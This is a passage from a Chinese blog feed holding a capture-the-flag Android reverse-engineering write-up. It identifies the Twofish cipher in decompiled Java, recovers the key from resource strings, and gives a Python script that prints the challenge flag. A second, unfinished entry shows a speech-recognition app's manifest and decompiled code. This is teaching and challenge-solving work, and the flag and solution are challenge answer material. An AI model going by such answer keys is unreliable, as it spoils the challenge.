&amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][b.a[0][v3] &amp; 0xFF ^ b.g(v9_1)] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][b.a[1][v1_1] &amp; 0xFF ^ b.h(v9_1)] &amp; 0xFF ^ b.h(v8_1)];            goto label_124;        label_126:            v13[v2 * 2] = b.b[0][b.a[0][v2] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][v2] &amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][v2] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][v2] &amp; 0xFF ^ b.h(v8_1)];        label_124:            ++v2;            goto label_120;        label_324:            v1_2 = new Object[]{v13, v11_1};        }        catch(Throwable v1) {            goto label_8;        }        __monitor_exit(v6);        return v1_2;    label_8:        __monitor_exit(v6);        throw v1;    }</code></pre><p>这个 a 函数判断传入的字节数组、、密钥都不为空，并调用 b 函数：</p><pre><code class="java">    public static byte[] a(byte[] arg1, int arg2, Object arg3) {        byte[] v0 = arg1 == null || arg3 == null || arg2 &lt; 0 ? null : b.b(arg1, arg2, arg3);        return v0;    }</code></pre><p>b 函数应该就是对数据的加密过程，明显是个 16 次轮函数的分组密码：</p><pre><code class="java">    private static byte[] b(byte[] arg12, int arg13, Object arg14) {        int[] v0 = arg14[0];        Object v1 = arg14[1];        int v2 = arg13 + 1;        int v4 = v2 + 1;        int v3 = v4 + 1;        v2 = (arg12[v2] &amp; 0xFF) &lt;&lt; 8 | arg12[arg13] &amp; 0xFF | (arg12[v4] &amp; 0xFF) &lt;&lt; 16;        v4 = v3 + 1;        v2 |= (arg12[v3] &amp; 0xFF) &lt;&lt; 24;        v3 = v4 + 1;        int v5 = v3 + 1;        v3 = (arg12[v3] &amp; 0xFF) &lt;&lt; 8 | arg12[v4] &amp; 0xFF;        v4 = v5 + 1;        v3 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 16;        v5 = v4 + 1;        v3 |= (arg12[v4] &amp; 0xFF) &lt;&lt; 24;        v4 = v5 + 1;        int v6 = v4 + 1;        v4 = (arg12[v4] &amp; 0xFF) &lt;&lt; 8 | arg12[v5] &amp; 0xFF;        v5 = v6 + 1;        v4 |= (arg12[v6] &amp; 0xFF) &lt;&lt; 16;        v6 = v5 + 1;        v4 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 24;        v5 = v6 + 1;        int v7 = v5 + 1;        int v8 = (arg12[v5] &amp; 0xFF) &lt;&lt; 8 | arg12[v6] &amp; 0xFF | (arg12[v7] &amp; 0xFF) &lt;&lt; 16 | (arg12[v7 + 1] &amp; 0xFF) &lt;&lt; 24;        v7 = v2 ^ v1[0];        v6 = v3 ^ v1[1];        v5 = v4 ^ v1[2];        v4 = v8 ^ v1[3];        v3 = 8;        for(v2 = 0; v2 &lt; 16; v2 += 2) {            v8 = b.a(v0, v7, 0);            int v9 = b.a(v0, v6, 3);            int v11 = v3 + 1;            v3 = v1[v3] + (v8 + v9) ^ v5;            v5 = v3 &gt;&gt;&gt; 1 | v3 &lt;&lt; 0x1F;            v3 = v4 &lt;&lt; 1 | v4 &gt;&gt;&gt; 0x1F;            v4 = v9 * 2 + v8;            v8 = v11 + 1;            v4 = v4 + v1[v11] ^ v3;            v3 = b.a(v0, v5, 0);            v9 = b.a(v0, v4, 3);            v11 = v8 + 1;            v7 ^= v1[v8] + (v3 + v9);            v7 = v7 &lt;&lt; 0x1F | v7 &gt;&gt;&gt; 1;            v8 = v9 * 2 + v3;            v3 = v11 + 1;            v6 = (v6 &gt;&gt;&gt; 0x1F | v6 &lt;&lt; 1) ^ v8 + v1[v11];        }        int v0_1 = v1[4] ^ v5;        v2 = v1[5] ^ v4;        v3 = v1[6] ^ v7;        int v1_1 = v1[7] ^ v6;        return new byte[]{((byte)v0_1), ((byte)(v0_1 &gt;&gt;&gt; 8)), ((byte)(v0_1 &gt;&gt;&gt; 16)), ((byte)(v0_1 &gt;&gt;&gt; 24)), ((byte)v2), ((byte)(v2 &gt;&gt;&gt; 8)), ((byte)(v2 &gt;&gt;&gt; 16)), ((byte)(v2 &gt;&gt;&gt; 24)), ((byte)v3), ((byte)(v3 &gt;&gt;&gt; 8)), ((byte)(v3 &gt;&gt;&gt; 16)), ((byte)(v3 &gt;&gt;&gt; 24)), ((byte)v1_1), ((byte)(v1_1 &gt;&gt;&gt; 8)), ((byte)(v1_1 &gt;&gt;&gt; 16)), ((byte)(v1_1 &gt;&gt;&gt; 24))};    }</code></pre><p>分组密码可以去找一下特征，看到了 b 类的头上定义了两个数据，转成 16 进制之后拿去搜一下：</p><pre><code class="java">        v0[0] = new byte[]{-87, 103, -77, -24, 4, -3, -93, 0x76, -102, -110, -128, 120, -28, -35, -47, 56, 13, -58, 53, -104, 24, -9, -20, 108, 67, 0x75, 55, 38, -6, 19, -108, 72, -14, -48, -117, 0x30, -124, 84, -33, 35, 25, 91, 61, 89, -13, -82, -94, -126, 99, 1, -125, 46, -39, 81, -101, 0x7C, -90, -21, -91, -66, 22, 12, -29, 97, -64, -116, 58, -11, 0x73, 44, 37, 11, -69, 78, -119, 107, 83, 106, -76, -15, -31, -26, -67, 69, -30, -12, -74, 102, -52, -107, 3, 86, -44, 28, 30, -41, -5, -61, -114, -75, -23, -49, -65, -70, -22, 0x77, 57, -81, 51, -55, 98, 0x71, -127, 0x79, 9, -83, 36, -51, -7, -40, -27, -59, -71, 77, 68, 8, -122, -25, -95, 29, -86, -19, 6, 0x70, -78, -46, 65, 0x7B, -96, 17, 49, -62, 39, -112, 0x20, -10, 0x60, -1, -106, 92, -79, -85, -98, -100, 82, 27, 0x5F, -109, 10, -17, -111, -123, 73, -18, 45, 0x4F, -113, 59, 71, -121, 109, 70, -42, 62, 105, 100, 42, -50, -53, 0x2F, -4, -105, 5, 0x7A, -84, 0x7F, -43, 26, 75, 14, -89, 90, 40, 20, 0x3F, 41, -120, 60, 76, 2, -72, -38, -80, 23, 85, 0x1F, -118, 0x7D, 87, -57, -115, 0x74, -73, -60, -97, 0x72, 0x7E, 21, 34, 18, 88, 7, -103, 52, 110, 80, -34, 104, 101, -68, -37, -8, -56, -88, 43, 0x40, -36, -2, 50, -92, -54, 16, 33, -16, -45, 93, 15, 0, 0x6F, -99, 54, 66, 74, 94, -63, -32}; // 0xA9, 0x67, 0xB3, 0xE8, 0x04, 0xFD, 0xA3, 0x76, 0x9A, 0x92, 0x80, 0x78, 0xE4, 0xDD, 0xD1, 0x38, 0x0D, 0xC6, 0x35, 0x98, 0x18, 0xF7, 0xEC, 0x6C, 0x43, 0x75, 0x37, 0x26, 0xFA, 0x13, 0x94, 0x48, 0xF2, 0xD0, 0x8B, 0x30, 0x84, 0x54, 0xDF, 0x23, 0x19, 0x5B, 0x3D, 0x59, 0xF3, 0xAE, 0xA2, 0x82, 0x63, 0x01, 0x83, 0x2E, 0xD9, 0x51, 0x9B, 0x7C, 0xA6, 0xEB, 0xA5, 0xBE, 0x16, 0x0C, 0xE3, 0x61, 0xC0, 0x8C, 0x3A, 0xF5, 0x73, 0x2C, 0x25, 0x0B, 0xBB, 0x4E, 0x89, 0x6B, 0x53, 0x6A, 0xB4, 0xF1, 0xE1, 0xE6, 0xBD, 0x45, 0xE2, 0xF4, 0xB6, 0x66, 0xCC, 0x95, 0x03, 0x56, 0xD4, 0x1C, 0x1E, 0xD7, 0xFB, 0xC3, 0x8E, 0xB5, 0xE9, 0xCF, 0xBF, 0xBA, 0xEA, 0x77, 0x39, 0xAF, 0x33, 0xC9, 0x62, 0x71, 0x81, 0x79, 0x09, 0xAD, 0x24, 0xCD, 0xF9, 0xD8, 0xE5, 0xC5, 0xB9, 0x4D, 0x44, 0x08, 0x86, 0xE7, 0xA1, 0x1D, 0xAA, 0xED, 0x06, 0x70, 0xB2, 0xD2, 0x41, 0x7B, 0xA0, 0x11, 0x31, 0xC2, 0x27, 0x90, 0x20, 0xF6, 0x60, 0xFF, 0x96, 0x5C, 0xB1, 0xAB, 0x9E, 0x9C, 0x52, 0x1B, 0x5F, 0x93, 0x0A, 0xEF, 0x91, 0x85, 0x49, 0xEE, 0x2D, 0x4F, 0x8F, 0x3B, 0x47, 0x87, 0x6D, 0x46, 0xD6, 0x3E, 0x69, 0x64, 0x2A, 0xCE, 0xCB, 0x2F, 0xFC, 0x97, 0x05, 0x7A, 0xAC, 0x7F, 0xD5, 0x1A, 0x4B, 0x0E, 0xA7, 0x5A, 0x28, 0x14, 0x3F, 0x29, 0x88, 0x3C, 0x4C, 0x02, 0xB8, 0xDA, 0xB0, 0x17, 0x55, 0x1F, 0x8A, 0x7D, 0x57, 0xC7, 0x8D, 0x74, 0xB7, 0xC4, 0x9F, 0x72, 0x7E, 0x15, 0x22, 0x12, 0x58, 0x07, 0x99, 0x34, 0x6E, 0x50, 0xDE, 0x68, 0x65, 0xBC, 0xDB, 0xF8, 0xC8, 0xA8, 0x2B, 0x40, 0xDC, 0xFE, 0x32, 0xA4, 0xCA, 0x10, 0x21, 0xF0, 0xD3, 0x5D, 0x0F, 0x00, 0x6F, 0x9D, 0x36, 0x42, 0x4A, 0x5E, 0xC1, 0xE0        v0[1] = new byte[]{0x75, -13, -58, -12, -37, 0x7B, -5, -56, 74, -45, -26, 107, 69, 0x7D, -24, 75, -42, 50, -40, -3, 55, 0x71, -15, -31, 0x30, 15, -8, 27, -121, -6, 6, 0x3F, 94, -70, -82, 91, -118, 0, -68, -99, 109, -63, -79, 14, -128, 93, -46, -43, -96, -124, 7, 20, -75, -112, 44, -93, -78, 0x73, 76, 84, -110, 0x74, 54, 81, 56, -80, -67, 90, -4, 0x60, 98, -106, 108, 66, -9, 16, 0x7C, 40, 39, -116, 19, -107, -100, -57, 36, 70, 59, 0x70, -54, -29, -123, -53, 17, -48, -109, -72, -90, -125, 0x20, -1, -97, 0x77, -61, -52, 3, 0x6F, 8, -65, 0x40, -25, 43, -30, 0x79, 12, -86, -126, 65, 58, -22, -71, -28, -102, -92, -105, 0x7E, -38, 0x7A, 23, 102, -108, -95, 29, 61, -16, -34, -77, 11, 0x72, -89, 28, -17, -47, 83, 62, -113, 51, 38, 0x5F, -20, 0x76, 42, 73, -127, -120, -18, 33, -60, 26, -21, -39, -59, 57, -103, -51, -83, 49, -117, 1, 24, 35, -35, 0x1F, 78, 45, -7, 72, 0x4F, -14, 101, -114, 120, 92, 88, 25, -115, -27, -104, 87, 103, 0x7F, 5, 100, -81, 99, -74, -2, -11, -73, 60, -91, -50, -23, 104, 68, -32, 77, 67, 105, 41, 46, -84, 21, 89, -88, 10, -98, 110, 71, -33, 52, 53, 106, -49, -36, 34, -55, -64, -101, -119, -44, -19, -85, 18, -94, 13, 82, -69, 2, 0x2F, -87, -41, 97, 30, -76, 80, 4, -10, -62, 22, 37, -122, 86, 85, 9, -66, -111}; // 0x75, 0xF3, 0xC6, 0xF4, 0xDB, 0x7B, 0xFB, 0xC8, 0x4A, 0xD3, 0xE6, 0x6B, 0x45, 0x7D, 0xE8, 0x4B, 0xD6, 0x32, 0xD8, 0xFD, 0x37, 0x71, 0xF1, 0xE1, 0x30, 0x0F, 0xF8, 0x1B, 0x87, 0xFA, 0x06, 0x3F, 0x5E, 0xBA, 0xAE, 0x5B, 0x8A, 0x00, 0xBC, 0x9D, 0x6D, 0xC1, 0xB1, 0x0E, 0x80, 0x5D, 0xD2, 0xD5, 0xA0, 0x84, 0x07, 0x14, 0xB5, 0x90, 0x2C, 0xA3, 0xB2, 0x73, 0x4C, 0x54, 0x92, 0x74, 0x36, 0x51, 0x38, 0xB0, 0xBD, 0x5A, 0xFC, 0x60, 0x62, 0x96, 0x6C, 0x42, 0xF7, 0x10, 0x7C, 0x28, 0x27, 0x8C, 0x13, 0x95, 0x9C, 0xC7, 0x24, 0x46, 0x3B, 0x70, 0xCA, 0xE3, 0x85, 0xCB, 0x11, 0xD0, 0x93, 0xB8, 0xA6, 0x83, 0x20, 0xFF, 0x9F, 0x77, 0xC3, 0xCC, 0x03, 0x6F, 0x08, 0xBF, 0x40, 0xE7, 0x2B, 0xE2, 0x79, 0x0C, 0xAA, 0x82, 0x41, 0x3A, 0xEA, 0xB9, 0xE4, 0x9A, 0xA4, 0x97, 0x7E, 0xDA, 0x7A, 0x17, 0x66, 0x94, 0xA1, 0x1D, 0x3D, 0xF0, 0xDE, 0xB3, 0x0B, 0x72, 0xA7, 0x1C, 0xEF, 0xD1, 0x53, 0x3E, 0x8F, 0x33, 0x26, 0x5F, 0xEC, 0x76, 0x2A, 0x49, 0x81, 0x88, 0xEE, 0x21, 0xC4, 0x1A, 0xEB, 0xD9, 0xC5, 0x39, 0x99, 0xCD, 0xAD, 0x31, 0x8B, 0x01, 0x18, 0x23, 0xDD, 0x1F, 0x4E, 0x2D, 0xF9, 0x48, 0x4F, 0xF2, 0x65, 0x8E, 0x78, 0x5C, 0x58, 0x19, 0x8D, 0xE5, 0x98, 0x57, 0x67, 0x7F, 0x05, 0x64, 0xAF, 0x63, 0xB6, 0xFE, 0xF5, 0xB7, 0x3C, 0xA5, 0xCE, 0xE9, 0x68, 0x44, 0xE0, 0x4D, 0x43, 0x69, 0x29, 0x2E, 0xAC, 0x15, 0x59, 0xA8, 0x0A, 0x9E, 0x6E, 0x47, 0xDF, 0x34, 0x35, 0x6A, 0xCF, 0xDC, 0x22, 0xC9, 0xC0, 0x9B, 0x89, 0xD4, 0xED, 0xAB, 0x12, 0xA2, 0x0D, 0x52, 0xBB, 0x02, 0x2F, 0xA9, 0xD7, 0x61, 0x1E, 0xB4, 0x50, 0x04, 0xF6, 0xC2, 0x16, 0x25, 0x86, 0x56, 0x55, 0x09, 0xBE, 0x91</code></pre><p>发现是 twofish 算法：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/2.png" srcset="/img/loading.gif" alt></p><p>上面的一些资源可以在 Resources/values/public.xml 中找到 ID 对应的字符串名：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;public id=&quot;0x7f04001a&quot; name=&quot;activity_main&quot; type=&quot;layout&quot; /&gt;  ...  &lt;public id=&quot;0x7f060022&quot; name=&quot;no&quot; type=&quot;string&quot; /&gt;  &lt;public id=&quot;0x7f060023&quot; name=&quot;two_fish&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f060025&quot; name=&quot;yes&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f0b0054&quot; name=&quot;edit_text&quot; type=&quot;id&quot; /&gt;  &lt;public id=&quot;0x7f0b0055&quot; name=&quot;button&quot; type=&quot;id&quot; /&gt;  ...&lt;/resources&gt;</code></pre><p>可以在 Resources/values/strings.xml 中找到对应的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;string name=&quot;no&quot;&gt;    NO~ You don&#39;t get me~ T_T&lt;/string&gt;  &lt;string name=&quot;two_fish&quot;&gt;    I have a male fish and a female fish.&lt;/string&gt;  &lt;string name=&quot;what_else&quot;&gt;    What else?&lt;/string&gt;  &lt;string name=&quot;yes&quot;&gt;    Yes! You got me! :)&lt;/string&gt;&lt;/resources&gt;</code></pre><p>最后找个库实现一下解密：</p><pre><code class="python">#!/usr/bin/env pythonfrom twofish import Twofishciphertext = [0x88, 0x4D, 0xF2, 0xDA, 0x11, 0x05, 0xD6, 0x2C, 0xE0, 0x6D, 0x55, 0x1F, 0x18, 0xA5, 0x90, 0xAD, 0x40, 0xAD, 0x80, 0x54, 0x05, 0xA2, 0x9E, 0xE2, 0x12, 0x46, 0xE6, 0x47, 0x05, 0x9D, 0xC2, 0xC6, 0x75, 0x1D, 0xD4, 0x06, 0x70, 0xFC, 0x51, 0x54, 0x09, 0x16, 0xCD, 0x5F, 0xDE, 0x0C, 0x2F, 0x4D]ciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])T = Twofish(&#39;I have a male fish and a female &#39;)flag = &#39;&#39;for i in range(0, 48, 16):    flag += T.decrypt(ciphertext[i:i+16])print flag# qwb{TH3y_Io&lt;e_EACh_OTh3r_FOrEUER}</code></pre><h1 id="你是谁"><a href="#你是谁" class="headerlink" title="你是谁"></a>你是谁</h1><p>TODO</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;xyz.konso.testsrtp&quot; platformBuildVersionCode=&quot;23&quot; platformBuildVersionName=&quot;6.0-2166767&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;15&quot; android:targetSdkVersion=&quot;23&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CHANGE_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.BROADCAST_STICKY&quot; /&gt;    注：部分手机如无此权限会报错    &lt;uses-permission android:name=&quot;android.permission.BLUETOOTH&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.MODIFY_AUDIO_SETTINGS&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/icon&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot;&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.view&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.SplashActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.content.Intent;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.os.Handler;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.widget.TextView;public class SplashActivity extends Activity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        getWindow().setFlags(AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT, AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT);        setContentView(R.layout.activity_splash);        try {            ((TextView) findViewById(R.id.versionNumber)).setText(&quot;Version &quot; + getPackageManager().getPackageInfo(&quot;com.lyt.android&quot;, 0).versionName);        } catch (NameNotFoundException e) {            e.printStackTrace();        }        new Handler().postDelayed(new Runnable() {            public void run() {                SplashActivity.this.startActivity(new Intent(SplashActivity.this, MainActivity.class));                SplashActivity.this.finish();            }        }, 2500);    }}</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.media.AudioManager;import android.os.Bundle;import android.util.Log;import android.widget.Button;import android.widget.Toast;import com.iflytek.cloud.InitListener;import com.iflytek.cloud.RecognizerListener;import com.iflytek.cloud.RecognizerResult;import com.iflytek.cloud.SpeechConstant;import com.iflytek.cloud.SpeechError;import com.iflytek.cloud.SpeechRecognizer;import com.iflytek.cloud.SpeechSynthesizer;import com.iflytek.cloud.SpeechUtility;import com.iflytek.cloud.SynthesizerListener;import org.json.JSONObject;public class MainActivity extends Activity {    private String TAG = &quot;shitou&quot;;    private Button button1;    private Button button2;    private AudioManager mAudioManager;    private SpeechRecognizer mIat;    private InitListener mInitListener = new InitListener() {        public void onInit(int code) {            Log.d(MainActivity.this.TAG, &quot;SpeechRecognizer init() code = &quot; + code);        }    };    private SynthesizerListener mSynListener = new SynthesizerListener() {        public void onCompleted(SpeechError error) {        }        public void onBufferProgress(int percent, int beginPos, int endPos, String info) {        }        public void onSpeakBegin() {            Log.d(MainActivity.this.TAG, &quot;speakcheck&quot;);        }        public void onSpeakPaused() {        }        public void onSpeakProgress(int percent, int beginPos, int endPos) {        }        public void onSpeakResumed() {        }        public void onEvent(int arg0, int arg1, int arg2, Bundle arg3) {        }    };    private SpeechSynthesizer mTts;    private RecognizerListener recognizerListener = new RecognizerListener() {        public void onBeginOfSpeech() {        }        public void onError(SpeechError error) {        }        public void onEndOfSpeech() {        }        public void onResult(RecognizerResult results, boolean isLast) {            Log.d(MainActivity.this.TAG, results.getResultString());            try {                MainActivity.this.ss = new JSONObject(results.getResultString()).getJSONArray(&quot;ws&quot;).getJSONObject(0).getJSONArray(&quot;cw&quot;).getJSONObject(0).getString(&quot;w&quot;);            } catch (Exception e) {                Log.d(MainActivity.this.TAG, &quot;catch Excepetion&quot;);            }            if (MainActivity.this.ss.equals(&quot;\u4f60\u597d&quot;)) { // 你好                MainActivity.this.getsna();            }            Log.d(MainActivity.this.TAG, MainActivity.this.ss);        }        public void onVolumeChanged(int volume, byte[] var2) {        }        public void onEvent(int eventType, int arg1, int arg2, Bundle obj) {        }    };    private JSONObject res;    private String ss;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(new background(this));        this.mAudioManager = (AudioManager) getSystemService(&quot;audio&quot;);        this.mAudioManager.setBluetoothScoOn(true);        this.mAudioManager.startBluetoothSco();        SpeechUtility.createUtility(this, &quot;appid=561e6833&quot;);        this.mIat = SpeechRecognizer.createRecognizer(this, this.mInitListener);        this.mTts = SpeechSynthesizer.createSynthesizer(this, null);    }    public void setParam() {        this.mIat.setParameter(SpeechConstant.DOMAIN, &quot;iat&quot;);        this.mIat.setParameter(SpeechConstant.LANGUAGE, &quot;zh_cn&quot;);        this.mIat.setParameter(SpeechConstant.ACCENT, &quot;mandarin&quot;);    }    public void getsna() {        Toast.makeText(this, &quot;haha&quot;, 0).show();    }    protected void onDestroy() {        super.onDestroy();        this.mAudioManager.setBluetoothScoOn(false);        this.mAudioManager.stopBluetoothSco();    }}</code></pre><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *vm){  jclass v2; // r4  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = 0;  if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65540) )    return -1;  if ( byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;JNI_OnLoad is called !&quot;);  v2 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, &quot;java/io/FileDescriptor&quot;);  if ( !v2 &amp;&amp; byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find Java class java.io.FileDescriptor&quot;);  dword_FFC14 = (int)env-&gt;functions-&gt;GetFieldID(&amp;env-&gt;functions, v2, &quot;descriptor&quot;, &quot;I&quot;);  if ( dword_FFC14 || !byte_FF45C )             // get descriptor in FileDescriptor and judge    return 65540;  _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find descriptor field in java.io.FileDescriptor&quot;);  return 65540;}</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/a2f826064e29" target="_blank" rel="noopener">https://www.jianshu.com/p/a2f826064e29</a><br><a href="https://blog.csdn.net/jscese/article/details/51005447" target="_blank" rel="noopener">https://blog.csdn.net/jscese/article/details/51005447</a><br><a href="https://blog.csdn.net/zhuzhuzhu22/article/details/80306203" target="_blank" rel="noopener">https://blog.csdn.net/zhuzhuzhu22/article/details/80306203</a><br><a href="https://blog.csdn.net/ldpxxx/article/details/9253369" target="_blank" rel="noopener">https://blog.csdn.net/ldpxxx/article/details/9253369</a><br><a href="https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex" target="_blank" rel="noopener">https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex</a><br><a href="https://www.52pojie.cn/thread-1105062-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1105062-1-1.html</a><br><a href="https://blog.csdn.net/jason0539/article/details/10049899" target="_blank" rel="noopener">https://blog.csdn.net/jason0539/article/details/10049899</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;持续更新。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
</feed>
